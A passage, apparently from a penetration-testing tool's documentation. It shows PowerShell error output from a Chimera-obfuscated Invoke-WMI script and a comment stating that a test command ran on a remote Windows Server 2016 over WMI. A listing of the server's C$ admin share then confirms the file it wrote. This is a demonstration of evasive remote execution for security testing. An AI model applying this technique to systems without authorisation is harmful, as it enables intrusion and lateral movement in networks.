gXtZccTPQGqwzRapVlzMoTkqQuxcOIvvhUbxMAHafedwaxWVcHUouUdrOvUaKRkNPwGYdBHzEiBALPOPKaxCxcAWdUYHBKbWAhlsgsUjmmBYFhbotJBQFZsTqlFvYBbtKGTbzcaR' is not recognized as the name of
a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At C:\Users\Administrator.PO718687\Documents\Tools-AD\chimera-Invoke-WMI3x3c.ps1:1470 char:17
+ ...             Start-lYfBbUyBkspeXAIwaaeznMhNvFWxgxdGyZeaTudPkhLfIhLXnYc ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Start-lYfBbUyBk...lFvYBbtKGTbzcaR:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException


=> Several error messages were displayed in the PowerShell session but the command "cmd /c echo pentest > C:\pentest.txt" was successfully executed
on the remote Windows server 2016 via WMI.

PS C:\Users\Administrator\Documents\Tools-AD> ls \\192.168.1.51\C$\

Directory: \\192.168.1.51\C$

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        02/09/2022     01:08                app
d-----        16/07/2016     15:23                PerfLogs
d-r---        13/11/2022     10:39                Program Files
d-----        02/09/2022     00:59                Program Files (x86)
d-----        24/10/2022     10:45                temp
d-r---        02/09/2022     01:21                Users
d-----        13/11/2022     11:12                Windows
-a----        13/11/2022     12:40             10 pentest.txt
